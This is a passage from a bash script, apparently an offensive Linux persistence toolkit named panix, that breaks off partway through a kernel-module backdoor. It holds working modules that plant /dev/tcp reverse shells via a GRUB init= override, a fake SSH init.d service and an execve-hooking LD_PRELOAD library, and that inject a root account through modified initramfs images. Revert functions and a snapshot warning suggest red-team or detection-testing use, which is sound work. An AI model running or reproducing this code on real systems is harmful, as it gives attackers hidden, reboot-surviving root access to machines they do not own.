		exit 1
	fi

	usage_grub() {
		echo "Usage: ./panix.sh --grub [OPTIONS]"
		echo "--default                          Use default reverse shell payload"
		echo "  --ip <ip>                        Specify IP address for reverse shell"
		echo "  --port <port>                    Specify port for reverse shell"
		echo "--custom                           Use custom payload"
		echo "  --payload <payload>              Specify custom payload command"
		echo ""
	}

	# Detect the distribution.
	local distro_id=""
	if [[ -f /etc/os-release ]]; then
		source /etc/os-release
		distro_id="$ID"
	else
		echo "Error: Unable to detect Linux distribution."
		exit 1
	fi

	# Process options.
	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--payload )
				shift
				payload="$1"
				;;
			--help|-h )
				usage_grub
				exit 0
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --grub --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --grub --custom --payload \"nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &\""
				echo ""
				exit 0
				;;
			* )
				echo "Invalid option for --grub: $1"
				echo "Try './panix.sh --grub --help' for more information."
				exit 1
				;;
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --grub --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --grub --help' for more information."
		exit 1
	fi

	# Only proceed if distro is Ubuntu/Debian
	if [[ "$distro_id" != "ubuntu" && "$distro_id" != "debian" ]]; then
		echo "This module is not compatible with the current OS: $distro_id"
		echo "This module is only compatible with Ubuntu/Debian, due to network/boot restrictions on other systems."
		echo "Feel free to remove this check and adapt for other operating systems if you wish."
		exit 1
	fi

	# Build the payload
	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be provided when using --default."
			exit 1
		fi
		payload="( sleep 10; nohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' & disown ) &"
	fi

	if [[ $custom -eq 1 ]]; then
		if [[ -z $payload ]]; then
			echo "Error: --payload must be specified when using --custom."
			exit 1
		fi
		payload="( sleep 10; ${payload} ) &"
	fi

	# 1) Create /grub-panix.sh as our init script
	local init_script="/grub-panix.sh"
	echo "[*] Creating backdoor init script at: $init_script"
	cat <<EOF > "$init_script"
#!/bin/bash
# Panix GRUB Persistence Backdoor (Ubuntu/Debian)
(
	echo "[*] Panix backdoor payload will execute after 10 seconds delay."
	${payload}
	echo "[+] Panix payload executed."
) &
exec /sbin/init
EOF

	chmod +x "$init_script"
	if [[ $? -ne 0 ]]; then
		echo "Error: Unable to set execute permission on $init_script."
		exit 1
	fi
	echo "[+] Backdoor init script created and made executable."

	# 2) Create a custom file in /etc/default/grub.d/ to append init=/grub-panix.sh
	local grub_custom_dir="/etc/default/grub.d"
	local grub_custom_file="${grub_custom_dir}/99-panix.cfg"

	mkdir -p "$grub_custom_dir"
	echo "[*] Creating custom GRUB configuration file: $grub_custom_file"
	cat <<EOF > "$grub_custom_file"
# Panix GRUB persistence configuration
GRUB_CMDLINE_LINUX_DEFAULT="\$GRUB_CMDLINE_LINUX_DEFAULT init=/grub-panix.sh"
EOF
	if [[ $? -ne 0 ]]; then
		echo "Error: Unable to create $grub_custom_file"
		exit 1
	fi
	echo "[+] Custom GRUB configuration file created."

	# 3) Backup /etc/default/grub (optional, just in case)
	local grub_default="/etc/default/grub"
	if [[ ! -f "$grub_default" ]]; then
		echo "Error: $grub_default not found!"
		exit 1
	fi

	if [[ ! -f "${grub_default}.bak" ]]; then
		echo "[*] Backing up $grub_default to ${grub_default}.bak..."
		cp "$grub_default" "${grub_default}.bak"
		if [[ $? -ne 0 ]]; then
			echo "Error: Unable to back up $grub_default."
			exit 1
		fi
		echo "[+] Backup created at ${grub_default}.bak"
	else
		echo "[!] A backup file ${grub_default}.bak already exists; skipping creation."
	fi

	# 4) Run update-grub to finalize changes
	echo "[*] Running 'update-grub' to apply changes..."
	if ! update-grub; then
		echo "Error: update-grub failed!"
		exit 1
	fi
	echo "[+] GRUB configuration updated. Reboot to activate the payload."
}

# Revert Module: revert_grub.sh
revert_grub() {
	usage_revert_grub() {
		echo "Usage: ./panix.sh --revert grub"
		echo "Reverts the GRUB persistence changes introduced by the module on Ubuntu/Debian."
	}

	# Must be run as root
	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	echo "[*] Reverting GRUB persistence modifications..."

	# 1) Restore /etc/default/grub if backup exists
	if [[ -f /etc/default/grub.bak ]]; then
		echo "[*] Restoring backup of /etc/default/grub from /etc/default/grub.bak..."
		cp /etc/default/grub.bak /etc/default/grub
		if [[ $? -ne 0 ]]; then
			echo "Error: Failed to restore /etc/default/grub from backup."
			return 1
		fi
		echo "[+] /etc/default/grub restored."
	else
		echo "[*] No backup /etc/default/grub.bak found. Skipping restore."
	fi

	# 2) Remove the /etc/grub.d/99_panix.cfg file
	local grub_custom_file="/etc/default/grub.d/99-panix.cfg"
	if [[ -f "$grub_custom_file" ]]; then
		echo "[*] Removing $grub_custom_file..."
		rm -f "$grub_custom_file"
		if [[ $? -ne 0 ]]; then
			echo "Error: Failed to remove $grub_custom_file."
			return 1
		fi
		echo "[+] $grub_custom_file removed."
	else
		echo "[*] $grub_custom_file not found; nothing to remove."
	fi

	# 3) Remove the /grub-panix.sh script
	local init_script="/grub-panix.sh"
	if [[ -f "$init_script" ]]; then
		echo "[*] Removing $init_script..."
		rm -f "$init_script"
		if [[ $? -ne 0 ]]; then
			echo "Error: Failed to remove $init_script."
			return 1
		fi
		echo "[+] $init_script removed."
	else
		echo "[*] $init_script not found; nothing to remove."
	fi

	# 4) Update GRUB (Ubuntu/Debian)
	echo "[*] Updating GRUB configuration..."
	if ! update-grub; then
		echo "Error: update-grub failed!"
		return 1
	fi
	echo "[+] GRUB configuration updated."

	echo "[+] GRUB persistence reverted successfully."
	return 0
}

# Module: setup_initd_backdoor.sh
setup_initd_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local initd_path="/etc/init.d/ssh-procps"

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_initd_backdoor() {
		echo "Usage: ./panix.sh --initd-backdoor [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default init.d settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom init.d settings"
		echo "  --command <command>          Specify custom command"
		echo "  --path <path>                Specify custom /etc/init.d/ file path"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				initd_path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --initd --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --initd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/init.d/initd-backdoor\""
				exit 0
				;;
			--help|-h)
				usage_initd_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --initd: $1"
				echo "Try './panix.sh --initd --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --initd --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --initd --help' for more information."
		exit 1
	fi

	create_initd_script() {
		local payload=$1
		mkdir -p /etc/init.d
		cat <<-EOF > $initd_path
		#! /bin/sh
		### BEGIN INIT INFO
		# Provides:             ssh sshd
		# Required-Start:       \$remote_fs \$syslog \$network
		# Required-Stop:        \$remote_fs \$syslog
		# Default-Start:        2 3 4 5
		# Default-Stop:        
		# Short-Description:    OpenBSD Secure Shell server
		### END INIT INFO

		$payload
		EOF
		chmod +x $initd_path
	}

	establish_persistence() {
		if sudo which update-rc.d >/dev/null 2>&1; then
			sudo update-rc.d $(basename $initd_path) defaults
		elif sudo which chkconfig >/dev/null 2>&1; then
			sudo chkconfig --add $(basename $initd_path)
			sudo chkconfig $(basename $initd_path) on
		elif sudo which systemctl >/dev/null 2>&1; then
			# Create systemd service
			local service_name=$(basename $initd_path)
			local service_path="/etc/systemd/system/${service_name}.service"
			cat <<-EOF > $service_path
			[Unit]
			Description=Custom Init Script
			After=network.target

			[Service]
			Type=simple
			ExecStart=$initd_path start
			ExecStop=$initd_path stop
			ExecReload=$initd_path reload
			Restart=always
			RestartSec=5
			TimeoutStopSec=30
			TimeoutStartSec=30

			[Install]
			WantedBy=multi-user.target
			EOF
			sudo systemctl daemon-reload
			sudo systemctl enable $service_name
			sudo systemctl start $service_name &
		elif sudo which service >/dev/null 2>&1; then
			# Using service to start the script directly
			sudo service $(basename $initd_path) start
		else
			echo "Error: No suitable method found to establish persistence."
			exit 1
		fi
	}

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --initd --help' for more information."
			exit 1
		fi

		local payload="nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
		if [[ ! -f $initd_path ]]; then
			create_initd_script "$payload"
		else
			echo "$payload" >> $initd_path
		fi
		establish_persistence
		echo "[+] init.d backdoor established!"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $initd_path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			echo "Try './panix.sh --initd --help' for more information."
			exit 1
		fi

		if [[ ! -f $initd_path ]]; then
			create_initd_script "$command"
		else
			echo "$command" >> $initd_path
		fi
		establish_persistence
		echo "[+] init.d backdoor established"
	fi
}

# Revert Module: revert_initd_backdoor.sh
revert_initd() {
	usage_revert_initd() {
		echo "Usage: ./panix.sh --revert initd"
		echo "Reverts any changes made by the setup_initd_backdoor module."
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	local initd_path="/etc/init.d/ssh-procps"
	local service_name=$(basename "$initd_path")
	local service_path="/etc/systemd/system/${service_name}.service"

	# Stop the service if it's running
	if systemctl is-active --quiet "$service_name.service"; then
		echo "[+] Stopping '$service_name' service..."
		systemctl stop "$service_name.service"
	else
		echo "[-] '$service_name' service is not running."
	fi

	# Disable the service if it's enabled
	if systemctl is-enabled --quiet "$service_name.service"; then
		echo "[+] Disabling '$service_name' service..."
		systemctl disable "$service_name.service"
	else
		echo "[-] '$service_name' service is not enabled."
	fi

	# Remove the systemd service file
	if [[ -f "$service_path" ]]; then
		echo "[+] Removing systemd service file '$service_path'..."
		rm -f "$service_path"
	else
		echo "[-] Systemd service file '$service_path' not found."
	fi

	# Remove the init.d script
	if [[ -f "$initd_path" ]]; then
		echo "[+] Removing init.d script '$initd_path'..."
		rm -f "$initd_path"
	else
		echo "[-] Init.d script '$initd_path' not found."
	fi

	# Remove symlinks created by update-rc.d
	if command -v update-rc.d &> /dev/null; then
		echo "[+] Removing init.d symlinks using 'update-rc.d'..."
		update-rc.d -f "$service_name" remove
	fi

	# Remove symlinks created by chkconfig
	if command -v chkconfig &> /dev/null; then
		echo "[+] Removing init.d symlinks using 'chkconfig'..."
		chkconfig --del "$service_name"
	fi

	# Reload systemd daemon
	echo "[+] Reloading systemd daemon..."
	systemctl daemon-reload

	# Kill any processes started by the init.d script
	echo "[+] Killing any processes started by '$initd_path'..."
	pkill -f "$initd_path"

	return 0
}

# Module: setup_initramfs.sh
setup_initramfs() {
	# Ensure that only root can run this module.
	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_initramfs() {
		echo "Usage: ./panix.sh --initramfs [OPTIONS]"
		echo ""
		echo "Required options:"
		echo "  --username <name>         Specify the username to be added"
		echo "  --password <password>     Specify the plaintext password for the user"
		echo "  --snapshot yes            Confirm you have a snapshot/backup (for safety)"
		echo ""
		echo "Persistence method (choose exactly one):"
		echo "  --dracut                  Use dracut-based initramfs modification method (requires dracut-core)"
		echo "  --binwalk                 Use binwalk-based initramfs modification method (requires binwalk and initramfs-tools)"
	}

	# Initialize option flags.
	local use_dracut=0
	local use_binwalk=0
	local snapshot=""
	local username=""
	local password=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--dracut)
				use_dracut=1
				;;
			--binwalk)
				use_binwalk=1
				;;
			--username)
				shift
				username="$1"
				;;
			--password)
				shift
				password="$1"
				;;
			--snapshot)
				shift
				snapshot="$1"
				;;
			--help|-h)
				usage_initramfs
				exit 0
				;;
			--examples)
				echo "Examples:"
				echo "sudo ./panix.sh --initramfs --dracut --username panix --password secret --snapshot yes"
				echo "sudo ./panix.sh --initramfs --binwalk --username panix --password secret --snapshot yes"
				exit 0
				;;
			*)
				echo "Invalid option: $1"
				usage_initramfs
				exit 1
				;;
		esac
		shift
	done

	# Ensure exactly one persistence method is chosen.
	if [[ $use_dracut -eq 0 && $use_binwalk -eq 0 ]]; then
		echo "Error: You must specify either --dracut or --binwalk."
		usage_initramfs
		exit 1
	fi
	if [[ $use_dracut -eq 1 && $use_binwalk -eq 1 ]]; then
		echo "Error: You cannot specify both --dracut and --binwalk."
		usage_initramfs
		exit 1
	fi

	# Verify that the required flags are provided.
	if [[ -z "$username" || -z "$password" ]]; then
		echo "Error: You must specify both --username and --password."
		usage_initramfs
		exit 1
	fi

	if [[ "$snapshot" != "yes" ]]; then
		echo "[!] Error: This module is potentially dangerous and can lock you out of your system."
		echo "[!] Learning how to undo the changes in the initramfs rescue shell is great a learning experience however!"
		echo "[!] For safety, you must supply --snapshot yes. Aborting."
		exit 1
	fi

	# Generate the password hash using openssl.
	local user_hash
	user_hash=$(openssl passwd -6 "$password")
	if [[ -z "$user_hash" ]]; then
		echo "Error: Failed to generate password hash."
		exit 1
	fi

	# Escape dollar signs so the hash is stored literally in the injected file.
	local escaped_hash
	escaped_hash=$(echo "$user_hash" | sed 's/\$/\\\$/g')

	#############################
	# Dracut-Based Method
	#############################
	if [[ $use_dracut -eq 1 ]]; then
		if ! command -v dracut &>/dev/null; then
			echo "Error: dracut-core is not installed. Please install it before continuing."
			exit 1
		fi

		if [ -f /etc/os-release ]; then
			. /etc/os-release
		fi
		if [[ "$ID" == "rhel" || "$ID" == "centos" || "$ID" == "fedora" ]]; then
			echo "[!] Warning: This might fail on Red Hat based systems due to differences in initramfs handling."
		fi

		echo "[!] Will inject user '${username}' with hashed password '${user_hash}' (password: '${password}') into the initramfs."

		echo "[!] Preparing Dracut-based initramfs persistence..."
		mkdir -p /usr/lib/dracut/modules.d/99panix || { echo "Error: Could not create /usr/lib/dracut/modules.d/99panix"; exit 1; }
		
		# Create a simple module setup script that uses a single hook.
		cat <<'EOF' > /usr/lib/dracut/modules.d/99panix/module-setup.sh
#!/bin/bash
check()  { return 0; }
depends() { return 0; }
install() {
	inst_hook pre-pivot 99 "$moddir/backdoor-user.sh"
}
EOF
		chmod +x /usr/lib/dracut/modules.d/99panix/module-setup.sh
		echo "[+] Created dracut module setup script at /usr/lib/dracut/modules.d/99panix/module-setup.sh"

		# Create the helper script named backdoor-user.sh.
		cat <<EOF > /usr/lib/dracut/modules.d/99panix/backdoor-user.sh
#!/bin/sh

# Remount the real root if it's read-only
mount -o remount,rw /sysroot 2>/dev/null || {
	echo "[dracut] Could not remount /sysroot as RW. Exiting."
	exit 1
}

# Function to check if a user already exists in a file
check_user_exists() {
	target="\$1"
	file="\$2"
	while read -r line; do
		if echo "\$line" | grep -q "^\$target:"; then
			return 0  # User exists
		fi
	done < "\$file"
	return 1  # User does not exist
}

# Check and add the user to /etc/shadow
if check_user_exists "${username}" /sysroot/etc/shadow; then
	echo "[dracut] User '${username}' already exists in /etc/shadow. Skipping."
else
	echo "${username}:${escaped_hash}:19000:0:99999:7:::" >> /sysroot/etc/shadow
	echo "[dracut] Added '${username}' to /etc/shadow."
fi

# Check and add the user to /etc/passwd
if check_user_exists "${username}" /sysroot/etc/passwd; then
	echo "[dracut] User '${username}' already exists in /etc/passwd. Skipping."
else
	echo "${username}:x:0:0::/root:/bin/bash" >> /sysroot/etc/passwd
	echo "[dracut] Added '${username}' to /etc/passwd."
fi

# Check and add the user to /etc/group
if check_user_exists "${username}" /sysroot/etc/group; then
	echo "[dracut] User '${username}' already exists in /etc/group. Skipping."
else
	echo "${username}:x:1337:" >> /sysroot/etc/group
	echo "[dracut] Added '${username}' to /etc/group."
fi
EOF
		chmod +x /usr/lib/dracut/modules.d/99panix/backdoor-user.sh
		echo "[+] Created dracut helper script at /usr/lib/dracut/modules.d/99panix/backdoor-user.sh"

		echo "[!] Rebuilding initramfs with dracut..."
		dracut --force /boot/initrd.img-$(uname -r) $(uname -r)
		if [[ $? -ne 0 ]]; then
			echo "Error: dracut failed to rebuild initramfs."
			exit 1
		fi
		echo "[+] Dracut rebuild complete."
	fi

	#############################
	# Binwalk-Based Method
	#############################

	# Source: https://breachlabs.io/initramfs-persistence-technique/

	if [[ $use_binwalk -eq 1 ]]; then
		if ! command -v binwalk &>/dev/null || ! command -v unmkinitramfs &>/dev/null; then
			echo "Error: binwalk and/or unmkinitramfs (from initramfs-tools) are not installed."
			exit 1
		fi

		echo "[!] Preparing Binwalk-based initramfs persistence..."
		TMP_DIR=$(mktemp -d /tmp/initramfs.XXXXXX) || { echo "Error: Could not create temporary directory"; exit 1; }
		echo "[!] Temporary directory: $TMP_DIR"

		local INITRD="/boot/initrd.img-$(uname -r)"
		cp "$INITRD" "${INITRD}.bak" || { echo "Error: Could not backup initrd.img"; exit 1; }
		echo "[+] Backup created: ${INITRD}.bak"

		cp "$INITRD" "$TMP_DIR/initrd.img" || { echo "Error: Could not copy initrd.img to temporary directory"; exit 1; }
		cd "$TMP_DIR" || exit 1

		# Use binwalk to determine the trailer address.
		ADDRESS=$(binwalk initrd.img | grep TRAILER | tail -1 | awk '{print $1}')
		if [[ -z "$ADDRESS" ]]; then
			echo "Error: Could not determine trailer address using binwalk."
			exit 1
		fi
		echo "[!] Trailer address: $ADDRESS"

		dd if=initrd.img of=initrd.img-begin count=$ADDRESS bs=1 2>/dev/null || { echo "Error: dd failed (begin)"; exit 1; }

		unmkinitramfs initrd.img initrd_extracted || { echo "Error: unmkinitramfs failed"; exit 1; }
		
		INIT_FILE="initrd_extracted/main/init"
		if [[ ! -f "$INIT_FILE" ]]; then
			echo "Error: Could not find initramfs main/init file."
			exit 1
		fi
		sed -i "/maybe_break init/i mount -o remount,rw \\\${rootmnt}\n\
# Use sed to remove lines starting with $username in /etc/passwd\n\
sed -i \"/^${username}:/d\" \\\${rootmnt}/etc/passwd\n\
# Use sed to remove lines starting with $username in /etc/shadow\n\
sed -i \"/^${username}:/d\" \\\${rootmnt}/etc/shadow\n\
# Use sed to remove lines starting with $username in /etc/group\n\
sed -i \"/^${username}:/d\" \\\${rootmnt}/etc/group\n\
echo \"${username}:x:0:0::/root:/bin/bash\" >> \\\${rootmnt}/etc/passwd\n\
echo '${username}:${user_hash}:19000:0:99999:7:::' >> \\\${rootmnt}/etc/shadow\n\
echo \"${username}:x:1337:\" >> \\\${rootmnt}/etc/group\n" "$INIT_FILE"

		mkdir -p initrd_repacked
		cd initrd_extracted/main || exit 1
		find . | sort | cpio -R 0:0 -o -H newc | gzip > ../../initrd.img-end || { echo "Error: Failed to repack initramfs"; exit 1; }
		cd "$TMP_DIR" || exit 1
		cat initrd.img-begin initrd.img-end > initrd.img-new || { echo "Error: Failed to combine initrd parts"; exit 1; }
		cp initrd.img-new "$INITRD" || { echo "Error: Could not install new initramfs"; exit 1; }
		echo "[+] Binwalk-based initramfs persistence applied. New initramfs installed."

		cd /
		rm -rf "$TMP_DIR"
	fi

	echo "[!] WARNING: Ensure you have a recent snapshot/backup of your system before proceeding."
}

# Revert Module: revert_initramfs.sh
# Function to revert initramfs changes
revert_initramfs() {
	usage_revert_initramfs() {
		echo "Usage: sudo ./panix.sh --revert initramfs"
		echo "This reverts changes made by the initramfs persistence module."
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# 1. Restore the original initramfs backup (if it exists)
	local initrd="/boot/initrd.img-$(uname -r)"
	local initrd_backup="${initrd}.bak"

	if [[ -f "$initrd_backup" ]]; then
		echo "[!] Restoring initramfs from backup: $initrd_backup..."
		cp "$initrd_backup" "$initrd"
		if [[ $? -ne 0 ]]; then
			echo "Error: Failed to restore initramfs from backup."
			return 1
		fi
		echo "[+] Initramfs restored successfully."
	else
		echo "[-] No backup initramfs found at $initrd_backup. Skipping restore."
	fi

	# 2. Remove the custom dracut module directory (if it exists)
	local dracut_dir="/usr/lib/dracut/modules.d/99panix"
	if [[ -d "$dracut_dir" ]]; then
		echo "[!] Removing custom dracut module directory: $dracut_dir..."
		rm -rf "$dracut_dir"
		if [[ $? -ne 0 ]]; then
			echo "Error: Failed to remove dracut module directory."
			return 1
		fi
		echo "[+] Custom dracut module directory removed."
	else
		echo "[-] Custom dracut module directory not found: $dracut_dir"
	fi

	# 3. Rebuild the initramfs using dracut or update-initramfs
	if command -v dracut &>/dev/null; then
		echo "[!] Rebuilding initramfs using dracut..."
		dracut --force "$initrd" "$(uname -r)"
		if [[ $? -ne 0 ]]; then
			echo "Error: dracut failed to rebuild initramfs."
			return 1
		fi
		echo "[+] Initramfs rebuilt successfully with dracut."
	elif command -v update-initramfs &>/dev/null; then
		echo "[!] Rebuilding initramfs using update-initramfs..."
		update-initramfs -u -k "$(uname -r)"
		if [[ $? -ne 0 ]]; then
			echo "Error: update-initramfs failed to rebuild initramfs."
			return 1
		fi
		echo "[+] Initramfs rebuilt successfully with update-initramfs."
	else
		echo "Warning: Neither dracut nor update-initramfs is installed. Skipping initramfs rebuild."
	fi

	# 4. Clean up temporary files (if applicable)
	local tmp_dir="/tmp/initramfs*"
	echo "[!] Cleaning up temporary files..."
	rm -rf $tmp_dir
	if [[ $? -ne 0 ]]; then
		echo "Error: Failed to clean up temporary files."
		return 1
	fi
	echo "[+] Temporary files cleaned up."

	echo "[+] Initramfs persistence reverted successfully."
	return 0
}

# Module: setup_ld_preload.sh
setup_ld_preload_backdoor() {
	local ip=""
	local port=""
	local binary=""
	local preload_compile_dir="/tmp/preload"
	local preload_name="preload_backdoor"
	local preload_source="${preload_compile_dir}/${preload_name}.c"
	local preload_lib="/lib/${preload_name}.so"
	local preload_file="/etc/ld.so.preload"

	# Ensure the function is executed as root
	if [[ $UID -ne 0 ]]; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_ld_preload_backdoor() {
		echo "Usage: ./panix.sh --ld-preload [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address for reverse shell"
		echo "--port <port>                Specify port for reverse shell"
		echo "--binary <binary>            Specify binary to monitor"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--examples )
				echo "Examples:"
				echo "./panix.sh --ld-preload --ip 192.168.211.131 --port 4444 --binary /usr/bin/whoami"
				exit 0
				;;
			--help|-h )
				usage_ld_preload_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --ld-preload: $1"
				echo "Try './panix.sh --ld-preload --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port || -z $binary ]]; then
		echo "Error: --ip, --port, and --binary must be specified."
		echo "Try './panix.sh --ld-preload --help' for more information."
		exit 1
	fi

	# Ensure GCC is installed
	if ! command -v gcc &>/dev/null; then
		echo "Error: GCC is not installed. Please install it to proceed."
		echo "For Debian/Ubuntu: sudo apt install gcc build-essential"
		echo "For Fedora/RHEL/CentOS: sudo dnf install gcc"
		exit 1
	fi

	# Ensure the compile directory exists
	mkdir -p ${preload_compile_dir}

	# Generate the C source code for the LD_PRELOAD backdoor
	cat <<-EOF > ${preload_source}
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/types.h>

// Reverse shell configuration
#define ATTACKER_IP "$ip"
#define ATTACKER_PORT $port

// Function pointer for the original execve
int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]);

// Function to spawn a reverse shell in the background
void spawn_reverse_shell() {
	pid_t pid = fork();
	if (pid == 0) { // Child process
		setsid(); // Start a new session
		char command[256];
		sprintf(command, "/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'", ATTACKER_IP, ATTACKER_PORT);
		execl("/bin/bash", "bash", "-c", command, NULL);
		exit(0); // Exit child process if execl fails
	}
}

// Hooked execve function
int execve(const char *pathname, char *const argv[], char *const envp[]) {
	// Load the original execve function
	if (!original_execve) {
		original_execve = dlsym(RTLD_NEXT, "execve");
		if (!original_execve) {
			exit(1);
		}
	}

	// Check if the executed binary matches the specified binary
	if (strstr(pathname, "$binary") != NULL) {
		// Spawn reverse shell in the background
		spawn_reverse_shell();
	}

	// Call the original execve function
	return original_execve(pathname, argv, envp);
}
EOF

	# Check if the source file was created
	if [ ! -f "$preload_source" ]; then
		echo "Failed to create the LD_PRELOAD source code at $preload_source"
		exit 1
	else
		echo "LD_PRELOAD source code created: $preload_source"
	fi

	# Compile the shared object
	gcc -shared -fPIC -o $preload_lib $preload_source -ldl
	if [ $? -ne 0 ]; then
		echo "Compilation failed. Exiting."
		exit 1
	fi

	echo "LD_PRELOAD shared object compiled successfully: $preload_lib"

	# Add to /etc/ld.so.preload for persistence
	if ! grep -q "$preload_lib" "$preload_file" 2>/dev/null; then
		echo $preload_lib >> $preload_file
		echo "[+] Backdoor added to /etc/ld.so.preload for persistence."
	else
		echo "[!] Backdoor already present in /etc/ld.so.preload."
	fi

	echo "[+] Execute the binary $binary to trigger the reverse shell."
}

# Revert Module: revert_ld_preload.sh
revert_ld_preload() {
	usage_revert_ld_preload() {
		echo "Usage: ./panix.sh --revert ld-preload"
		echo "Reverts any changes made by the setup_ld_preload module."
	}

	# Ensure the function is executed as root
	if [[ $UID -ne 0 ]]; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	local preload_compile_dir="/tmp/preload"
	local preload_name="preload_backdoor"
	local preload_source="${preload_compile_dir}/${preload_name}.c"
	local preload_lib="/lib/${preload_name}.so"
	local preload_file="/etc/ld.so.preload"

	# Remove the shared library path from /etc/ld.so.preload
	if [[ -f "$preload_file" ]]; then
		if grep -q "$preload_lib" "$preload_file"; then
			echo "[+] Removing $preload_lib from $preload_file..."
			sed -i "\|$preload_lib|d" "$preload_file"
			echo "[+] Removed entry from $preload_file."
		else
			echo "[-] $preload_lib not found in $preload_file."
		fi
	else
		echo "[-] $preload_file does not exist."
	fi

	# Remove the malicious shared library
	if [[ -f "$preload_lib" ]]; then
		echo "[+] Removing malicious shared library $preload_lib..."
		rm -f "$preload_lib"
		echo "[+] Removed $preload_lib."
	else
		echo "[-] Malicious shared library $preload_lib not found."
	fi

	# Clean up the compile directory
	if [[ -d "$preload_compile_dir" ]]; then
		echo "[+] Removing temporary directory $preload_compile_dir..."
		rm -rf "$preload_compile_dir"
		echo "[+] Removed $preload_compile_dir."
	else
		echo "[-] Temporary directory $preload_compile_dir not found."
	fi

	echo "[!] Note: The backdoor may still be active in your current session."
	echo "[!] Please restart your shell session to fully disable the backdoor."
	echo "[!] Run 'exec bash' to start a new shell session."

	return 0
}

# Module: setup_lkm.sh
setup_lkm_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local lkm_compile_dir="/tmp/lkm"
	local lkm_name="panix"
	local lkm_source="${lkm_compile_dir}/${lkm_name}.c"
	local lkm_destination="/lib/modules/$(uname -r)/kernel/drivers/${lkm_name}.ko"
	local lkm_path=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_lkm_backdoor() {
		echo "Usage: ./panix.sh --lkm [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default LKM settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom LKM settings"
		echo "  --path <path>                Specify custom kernel module path"
		echo "  --command <command>          Specify custom command to add to LKM"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				lkm_path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --lkm --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --lkm --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/lib/modules/$(uname -r)/kernel/drivers/custom_lkm.ko\""
				exit 0
				;;
			--help|-h)
				usage_lkm_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --lkm: $1"
				echo "Try './panix.sh --lkm --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --lkm --help' for more information."
		exit 1
	fi

